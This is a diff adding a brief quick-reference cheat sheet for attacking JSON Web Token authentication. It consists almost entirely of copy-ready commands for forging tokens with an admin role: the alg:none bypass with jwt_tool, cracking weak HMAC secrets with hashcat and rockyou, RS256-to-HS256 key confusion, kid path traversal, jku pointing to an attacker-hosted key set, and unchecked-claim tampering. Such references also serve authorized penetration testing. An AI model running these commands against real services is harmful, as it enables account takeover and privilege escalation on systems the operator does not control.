@@ -1,0 +1,11 @@
+JWT ATTACKS — QUICK REF
+
+Token = base64url(header).base64url(payload).signature
+
+Try in order:
+1. alg:none      jwt_tool <tok> -X a -pc role -pv admin
+2. weak secret   hashcat -m 16500 jwt.txt rockyou.txt  → jwt_tool -S hs256 -p '<secret>' -pc role -pv admin
+3. alg confusion (RS256→HS256)  jwt_tool <tok> -X k -pk public.pem -pc role -pv admin
+4. kid/jku/jwk injection        kid=../../../dev/null (sign w/ "") | jku=http://you/jwks.json | -X i
+5. claim tampering (sig unchecked)  edit sub/role, resend
+Decode/scan: jwt_tool <token>   |  Burp JWT Editor
